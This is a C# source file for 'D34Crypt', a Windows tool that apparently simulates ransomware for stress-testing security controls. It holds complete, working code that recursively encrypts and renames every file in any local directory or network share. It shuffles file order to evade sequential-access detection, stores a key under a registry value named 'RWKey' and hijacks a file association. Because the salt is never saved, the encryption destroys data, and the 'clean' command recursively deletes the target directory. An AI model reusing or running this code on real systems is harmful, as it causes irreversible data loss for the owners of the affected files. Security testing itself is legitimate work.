using System.Security.Cryptography;
using System.Runtime.InteropServices;
using System.Runtime.Versioning;
using Microsoft.Win32;

/// <summary>
/// Holds all cryptographic state used during a single encryption session.
/// A single Crypto instance is created at startup and shared across all
/// parallel file-encryption operations, so every file is encrypted with
/// the same AES key and IV.
///
/// Implements IDisposable so the underlying Aes object is released when
/// the using block in Main() exits.
/// </summary>
public class Crypto : IDisposable
{
    /// <summary>
    /// Initialises AES-256-CBC and derives the key + IV from a password
    /// and a randomly-generated salt using PBKDF2-SHA256.
    /// </summary>
    /// <exception cref="CryptographicException">
    /// Thrown if AES initialisation or key derivation fails.
    /// </exception>
    public Crypto()
    {
        // TODO: Replace the hard-coded password with a securely supplied
        // value (e.g. prompted at runtime or passed via a secure channel).
        string password = "password";

        // Generate a single 32-byte cryptographic salt.
        // RandomNumberGenerator.Fill is the modern, non-obsolete replacement
        // for RNGCryptoServiceProvider.
        byte[] salt = new byte[32];
        RandomNumberGenerator.Fill(salt);

        byte[] passwordBytes = System.Text.Encoding.UTF8.GetBytes(password);

        // Aes.Create() is the recommended factory — equivalent to the old
        // RijndaelManaged when BlockSize is 128 bits (the AES standard).
        Aes aes = Aes.Create();
        aes.KeySize = 256;            // 256-bit key
        aes.BlockSize = 128;            // 128-bit block (AES standard)
        aes.Padding = PaddingMode.PKCS7;
        aes.Mode = CipherMode.CBC;

        // Derive key + IV bytes in a single PBKDF2-SHA256 call.
        // 50,000 iterations provides strong resistance to brute-force attacks.
        // Rfc2898DeriveBytes.Pbkdf2() is the static replacement for the
        // now-obsolete Rfc2898DeriveBytes constructors (SYSLIB0060).
        int keySize = aes.KeySize / 8;  // 32 bytes
        int ivSize = aes.BlockSize / 8;  // 16 bytes
        byte[] derived = Rfc2898DeriveBytes.Pbkdf2(
            passwordBytes,
            salt,
            50000,
            HashAlgorithmName.SHA256,
            keySize + ivSize);

        // Slice derived bytes: first 32 → Key, remaining 16 → IV
        aes.Key = derived[..keySize];
        aes.IV = derived[keySize..];

        AES = aes;
        Salt = salt;
    }

    /// <summary>The configured AES cipher used to encrypt files.</summary>
    public Aes AES { get; private set; }

    /// <summary>
    /// The random salt used during key derivation. Persist this alongside
    /// encrypted data if decryption will be needed later.
    /// </summary>
    public byte[] Salt { get; private set; }

    /// <summary>Releases the underlying AES object.</summary>
    public void Dispose() => AES?.Dispose();
}

/// <summary>
/// D34Crypt — AES-256-CBC file encryption tool.
///
/// Usage:
///   D34Crypt run   &lt;extension&gt; [&lt;directory&gt;]
///   D34Crypt clean &lt;extension&gt; [&lt;directory&gt;]
///
/// Commands:
///   run   — Encrypts files and registers the output extension in the Windows
///            registry so encrypted files show a custom file-type association.
///            If no directory is supplied, three test directories ("one",
///            "two", "three") are created and populated with sample .txt files.
///
///   clean — Deletes the test directories (or the supplied directory) and
///            removes the registry entries created by "run".
///
/// Exit codes:
///   0 — success
///   1 — bad arguments or unrecognised command
///   2 — fatal runtime error
///
/// Notes:
///   • Registry operations are skipped on UNC paths — those keys only apply
///     to the local host, not the remote host owning the share.
///   • Windows-only due to Win32 shell P/Invokes and the Windows Registry.
/// </summary>
[SupportedOSPlatform("windows")]
public static class D34Crypt
{
    // ── Constants ────────────────────────────────────────────────────────────

    private const string AppName = "D34Crypt";
    private const string RegKeyPassword = "RWKey";

    // Default test directories used when no target directory is specified.
    private static readonly IReadOnlyList<string> DefaultDirectories =
        new[] { "one", "two", "three" };

    // ── P/Invoke ─────────────────────────────────────────────────────────────

    /// <summary>
    /// Forces Windows Explorer to refresh its file-type association cache
    /// after registry changes, so the new handler takes effect immediately.
    /// wEventId 0x08000000 = SHCNE_ASSOCCHANGED
    /// </summary>
    [DllImport("shell32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern void SHChangeNotify(
        uint wEventId, uint uFlags, IntPtr dwItem1, IntPtr dwItem2);

    /// <summary>
    /// Returns true if <paramref name="path"/> is a UNC path (\\server\share).
    /// Used to decide whether registry operations should be skipped.
    /// </summary>
    [DllImport("shlwapi.dll", CharSet = CharSet.Unicode)]
    private static extern bool PathIsUNC(
        [MarshalAs(UnmanagedType.LPWStr), In] string path);

    // ── Entry point ──────────────────────────────────────────────────────────

    /// <summary>
    /// Parses arguments and dispatches to <see cref="Run"/> or <see cref="Clean"/>.
    /// Exits with code 1 on bad arguments, 2 on a fatal runtime error.
    /// </summary>
    static void Main(string[] args)
    {
        Console.WriteLine(AppName);

        // Show help and exit cleanly when no arguments are given or the
        // user explicitly asks for help — exit code 0 (not an error).
        if (args.Length == 0 || args[0].ToLowerInvariant() is "help" or "-h" or "--help" or "/?")
        {
            PrintUsage();
            Environment.Exit(0);
        }

        if (args.Length < 2)
        {
            Console.Error.WriteLine("[ERROR] Not enough arguments.");
            PrintUsage();
            Environment.Exit(1);
        }

        string command = args[0].ToLowerInvariant();
        string extension = args[1];

        // Validate the extension is not empty or whitespace.
        if (string.IsNullOrWhiteSpace(extension))
        {
            Console.Error.WriteLine("[ERROR] Extension cannot be empty.");
            PrintUsage();
            Environment.Exit(1);
        }

        // Determine target directories and whether to create test files.
        List<string> directories;
        bool createFiles;
        bool unc = PathIsUNC(Directory.GetCurrentDirectory());

        if (args.Length >= 3)
        {
            string targetDir = args[2];

            // Validate the supplied directory exists (only relevant for "run").
            if (command == "run" && !Directory.Exists(targetDir))
            {
                Console.Error.WriteLine($"[ERROR] Directory not found: {targetDir}");
                Environment.Exit(1);
            }

            directories = new List<string> { targetDir };
            createFiles = false;

            // Inherit UNC flag from the supplied path if applicable.
            if (PathIsUNC(Path.GetFullPath(targetDir)))
                unc = true;
        }
        else
        {
            directories = new List<string>(DefaultDirectories);
            createFiles = true;
        }

        try
        {
            switch (command)
            {
                case "run":
                    using (Crypto crypto = new Crypto())
                    {
                        Run(directories, extension, createFiles, unc, crypto);
                    }
                    break;

                case "clean":
                    Clean(directories, extension, unc);
                    break;

                default:
                    Console.Error.WriteLine($"[ERROR] Unknown command: '{command}'");
                    PrintUsage();
                    Environment.Exit(1);
                    break;
            }
        }
        catch (Exception ex)
        {
            // Catch any unhandled fatal error and exit with code 2 so calling
            // scripts can distinguish a crash from a bad-argument error (code 1).
            Console.Error.WriteLine($"[FATAL] {ex.GetType().Name}: {ex.Message}");
            Environment.Exit(2);
        }

        Console.WriteLine("\nDone");
    }

    // ── Commands ─────────────────────────────────────────────────────────────

    /// <summary>
    /// Creates test files (if required), encrypts all discovered files in
    /// parallel, then writes registry entries for the file-type association.
    /// </summary>
    /// <param name="directories">Directories to create or operate on.</param>
    /// <param name="extension">Extension to append to encrypted files.</param>
    /// <param name="createFiles">
    ///   True to generate test directories and files; false to encrypt an
    ///   existing directory supplied on the command line.
    /// </param>
    /// <param name="unc">True if the target is on a UNC path.</param>
    /// <param name="crypto">Initialised crypto state for this session.</param>
    private static void Run(
        List<string> directories,
        string extension,
        bool createFiles,
        bool unc,
        Crypto crypto)
    {
        Console.WriteLine("run");

        var files = new List<string>();

        if (createFiles)
            files = CreateTestFiles(directories);
        else
            AddAllFiles(directories[0], files);

        if (files.Count == 0)
        {
            Console.WriteLine("[WARN] No files found to encrypt.");
            return;
        }

        // Shuffle so access order is non-sequential — useful for stress-testing
        // security controls that may key on sequential file-access patterns.
        files.Shuffle();

        int ct_enc = 0;
        int ct_skip = 0;

        // Encrypt in parallel. Interlocked.Increment is used instead of ++
        // because the lambda runs across multiple threads simultaneously.
        Parallel.ForEach(files, file =>
        {
            try
            {
                EncryptFile(file, extension, crypto);
                Console.WriteLine($"[ENC] {file}");
                Interlocked.Increment(ref ct_enc);
            }
            catch (UnauthorizedAccessException ex)
            {
                Console.Error.WriteLine($"[ERR] Access denied — {file}: {ex.Message}");
                Interlocked.Increment(ref ct_skip);
            }
            catch (IOException ex)
            {
                Console.Error.WriteLine($"[ERR] I/O error — {file}: {ex.Message}");
                Interlocked.Increment(ref ct_skip);
            }
            catch (CryptographicException ex)
            {
                Console.Error.WriteLine($"[ERR] Crypto error — {file}: {ex.Message}");
                Interlocked.Increment(ref ct_skip);
            }
        });

        Console.WriteLine($"\nEncrypted : {ct_enc}");
        Console.WriteLine($"Errors    : {ct_skip}");

        // Registry operations are skipped on UNC paths — those keys only
        // affect the local machine, not the host owning the share.
        if (!unc)
            WriteRegistry(extension);
    }

    /// <summary>
    /// Deletes test/target directories and removes the registry entries that
    /// were created by <see cref="Run"/>.
    /// </summary>
    /// <param name="directories">Directories to delete.</param>
    /// <param name="extension">Extension whose registry entries should be removed.</param>
    /// <param name="unc">True if the target is on a UNC path.</param>
    private static void Clean(List<string> directories, string extension, bool unc)
    {
        Console.WriteLine("clean");

        foreach (string directory in directories)
        {
            try
            {
                if (Directory.Exists(directory))
                {
                    Directory.Delete(directory, true);  // true = recursive
                    Console.WriteLine($"[DEL] {directory}");
                }
                else
                {
                    Console.WriteLine($"[SKIP] Directory not found: {directory}");
                }
            }
            catch (IOException ex)
            {
                Console.Error.WriteLine($"[ERR] Could not delete '{directory}': {ex.Message}");
            }
            catch (UnauthorizedAccessException ex)
            {
                Console.Error.WriteLine($"[ERR] Access denied deleting '{directory}': {ex.Message}");
            }
        }

        if (!unc)
            RemoveRegistry(extension);
    }

    // ── Registry helpers ─────────────────────────────────────────────────────

    /// <summary>
    /// Creates registry entries under HKCU for the encrypted file-type association.
    ///
    /// Layout:
    ///   HKCU\SOFTWARE\D34Crypt\RWKey              → password (for later decryption)
    ///   HKCU\SOFTWARE\Classes\.<extension>         → "D34Crypt"  (ProgID pointer)
    ///   HKCU\SOFTWARE\Classes\D34Crypt
    ///     \shell\open\command                      → calc.exe   (TODO: replace)
    ///
    /// See: https://stackoverflow.com/a/28585998
    /// </summary>
    /// <param name="extension">The encrypted file extension (without leading dot).</param>
    private static void WriteRegistry(string extension)
    {
        try
        {
            using RegistryKey software = Registry.CurrentUser.OpenSubKey("SOFTWARE", true)
                ?? throw new InvalidOperationException("Could not open HKCU\\SOFTWARE.");

            // Store the session password for later retrieval during decryption.
            using (RegistryKey appKey = software.CreateSubKey(AppName))
            {
                appKey.SetValue(RegKeyPassword, "password");
            }

            // Register the file-type association.
            using RegistryKey classes = software.CreateSubKey("Classes");
            using (RegistryKey extKey = classes.CreateSubKey("." + extension))
            {
                extKey.SetValue("", AppName);   // point extension → ProgID
            }

            using (RegistryKey progId = classes.CreateSubKey(AppName))
            using (RegistryKey shell = progId.CreateSubKey("shell"))
            using (RegistryKey open = shell.CreateSubKey("open"))
            using (RegistryKey command = open.CreateSubKey("command"))
            {
                // TODO: Replace calc.exe with the real decryption handler path.
                command.SetValue("", @"C:\Windows\System32\calc.exe");
            }

            // Notify Explorer to refresh its file-association cache immediately.
            // See: https://stackoverflow.com/a/2697804
            SHChangeNotify(0x08000000, 0x0000, IntPtr.Zero, IntPtr.Zero);
            Console.WriteLine("[REG] File association registered.");
        }
        catch (UnauthorizedAccessException ex)
        {
            Console.Error.WriteLine($"[ERR] Registry write access denied: {ex.Message}");
        }
        catch (Exception ex)
        {
            Console.Error.WriteLine($"[ERR] Registry write failed: {ex.Message}");
        }
    }

    /// <summary>
    /// Removes the registry entries created by <see cref="WriteRegistry"/>.
    /// Missing keys are silently ignored (idempotent clean).
    /// </summary>
    /// <param name="extension">The encrypted file extension (without leading dot).</param>
    private static void RemoveRegistry(string extension)
    {
        try
        {
            using RegistryKey software = Registry.CurrentUser.OpenSubKey("SOFTWARE", true)
                ?? throw new InvalidOperationException("Could not open HKCU\\SOFTWARE.");

            software.DeleteSubKeyTree(AppName, throwOnMissingSubKey: false);

            using RegistryKey? classes = software.OpenSubKey("Classes", true);
            if (classes != null)
            {
                classes.DeleteSubKeyTree("." + extension, throwOnMissingSubKey: false);
                classes.DeleteSubKeyTree(AppName, throwOnMissingSubKey: false);
            }

            SHChangeNotify(0x08000000, 0x0000, IntPtr.Zero, IntPtr.Zero);
            Console.WriteLine("[REG] File association removed.");
        }
        catch (UnauthorizedAccessException ex)
        {
            Console.Error.WriteLine($"[ERR] Registry delete access denied: {ex.Message}");
        }
        catch (Exception ex)
        {
            Console.Error.WriteLine($"[ERR] Registry delete failed: {ex.Message}");
        }
    }

    // ── File helpers ─────────────────────────────────────────────────────────

    /// <summary>
    /// Creates the default test directory structure and populates each with
    /// 50 numbered .txt files. If a file named "data" exists in the working
    /// directory its content is written into every generated file.
    /// </summary>
    /// <param name="directories">Directories to create.</param>
    /// <returns>List of all created file paths.</returns>
    private static List<string> CreateTestFiles(List<string> directories)
    {
        var files = new List<string>();

        // Load optional payload from the "data" file if present.
        string? fileData = File.Exists("data") ? File.ReadAllText("data") : null;

        foreach (string directory in directories)
        {
            try
            {
                Directory.CreateDirectory(directory);
            }
            catch (IOException ex)
            {
                Console.Error.WriteLine($"[ERR] Could not create directory '{directory}': {ex.Message}");
                continue;
            }

            foreach (int num in Enumerable.Range(1, 50))
            {
                string file = Path.Combine(directory, num + ".txt");
                try
                {
                    using StreamWriter sw = File.CreateText(file);
                    sw.WriteLine(directory);   // directory name as first line
                    sw.WriteLine(num);          // file number as second line
                    if (fileData != null)
                        sw.WriteLine(fileData); // optional payload
                    files.Add(file);
                }
                catch (IOException ex)
                {
                    Console.Error.WriteLine($"[ERR] Could not create file '{file}': {ex.Message}");
                }
            }
        }

        return files;
    }

    /// <summary>
    /// Encrypts a single file in-place using AES-256-CBC, then renames it
    /// by appending <paramref name="ext"/>.
    ///
    /// Process:
    ///   1. Read the entire file into memory (so the path is not open for
    ///      both reading and writing simultaneously).
    ///   2. Overwrite the original file with the AES ciphertext.
    ///   3. Rename to &lt;originalPath&gt;.&lt;ext&gt;.
    /// </summary>
    /// <param name="inputFile">Path to the file to encrypt.</param>
    /// <param name="ext">Extension to append (without leading dot).</param>
    /// <param name="crypto">Shared Crypto instance providing the AES key/IV.</param>
    /// <exception cref="IOException">File read/write or rename failure.</exception>
    /// <exception cref="UnauthorizedAccessException">Insufficient permissions.</exception>
    /// <exception cref="CryptographicException">AES encryption failure.</exception>
    public static void EncryptFile(string inputFile, string ext, Crypto crypto)
    {
        // Step 1: Read plaintext into memory and release the file handle.
        byte[] plaintext = File.ReadAllBytes(inputFile);

        // Step 2: Write ciphertext back to the same path (truncate first).
        using (MemoryStream memIn = new MemoryStream(plaintext))
        using (FileStream fsOut = new FileStream(inputFile, FileMode.Truncate))
        using (CryptoStream cs = new CryptoStream(
                   memIn, crypto.AES.CreateEncryptor(), CryptoStreamMode.Read))
        {
            cs.CopyTo(fsOut);
        }

        // Step 3: Rename the encrypted file to append the target extension.
        string encryptedPath = inputFile + "." + ext;
        File.Move(inputFile, encryptedPath);
    }

    /// <summary>
    /// Recursively enumerates all files under <paramref name="dir"/> and
    /// appends their paths to <paramref name="files"/>.
    /// Inaccessible subdirectories are skipped with a warning.
    /// </summary>
    /// <param name="dir">Root directory to search.</param>
    /// <param name="files">List to append discovered paths to.</param>
    public static void AddAllFiles(string dir, List<string> files)
    {
        try
        {
            files.AddRange(Directory.GetFiles(dir));
        }
        catch (UnauthorizedAccessException ex)
        {
            Console.Error.WriteLine($"[WARN] Cannot read files in '{dir}': {ex.Message}");
            return;
        }

        foreach (string subDir in Directory.GetDirectories(dir))
        {
            try
            {
                AddAllFiles(subDir, files);
            }
            catch (UnauthorizedAccessException ex)
            {
                Console.Error.WriteLine($"[WARN] Skipping inaccessible directory '{subDir}': {ex.Message}");
            }
            catch (IOException ex)
            {
                Console.Error.WriteLine($"[WARN] I/O error enumerating '{subDir}': {ex.Message}");
            }
        }
    }

    // ── Utilities ────────────────────────────────────────────────────────────

    /// <summary>
    /// Fisher-Yates in-place shuffle for any IList&lt;T&gt;.
    /// Randomises file processing order to stress-test security controls
    /// that may key on sequential access patterns.
    /// See: https://stackoverflow.com/a/1262619
    /// </summary>
    public static void Shuffle<T>(this IList<T> list)
    {
        int n = list.Count;
        while (n > 1)
        {
            n--;
            int k = Random.Shared.Next(n + 1);
            (list[n], list[k]) = (list[k], list[n]);
        }
    }

    /// <summary>Prints friendly usage information to stdout.</summary>
    private static void PrintUsage()
    {
        Console.WriteLine();
        Console.WriteLine($"  {AppName} — AES-256-CBC file encryption tool");
        Console.WriteLine();
        Console.WriteLine("  Usage:");
        Console.WriteLine($"    {AppName} <command> <extension> [<directory>]");
        Console.WriteLine();
        Console.WriteLine("  Commands:");
        Console.WriteLine("    run     Encrypt files and register a file-type association in the");
        Console.WriteLine("            Windows registry. If no directory is supplied, test");
        Console.WriteLine("            directories ('one', 'two', 'three') are created and");
        Console.WriteLine("            populated automatically.");
        Console.WriteLine();
        Console.WriteLine("    clean   Delete test directories and remove registry entries");
        Console.WriteLine("            created by 'run'.");
        Console.WriteLine();
        Console.WriteLine("  Arguments:");
        Console.WriteLine("    <extension>    Extension to append to encrypted files (e.g. enc)");
        Console.WriteLine("    [<directory>]  Optional target directory (local or UNC path)");
        Console.WriteLine();
        Console.WriteLine("  Examples:");
        Console.WriteLine($"    {AppName} run   enc                  Create test files and encrypt them");
        Console.WriteLine($"    {AppName} run   enc C:\\target        Encrypt an existing directory");
        Console.WriteLine($"    {AppName} run   enc \\\\srv\\share      Encrypt a UNC path (no registry)");
        Console.WriteLine($"    {AppName} clean enc                  Remove test files and registry");
        Console.WriteLine();
        Console.WriteLine("  Exit codes:");
        Console.WriteLine("    0  Success");
        Console.WriteLine("    1  Bad arguments or unknown command");
        Console.WriteLine("    2  Fatal runtime error");
        Console.WriteLine();
        Console.WriteLine($"  For help: {AppName} help  |  {AppName} -h  |  {AppName} --help");
    }
}
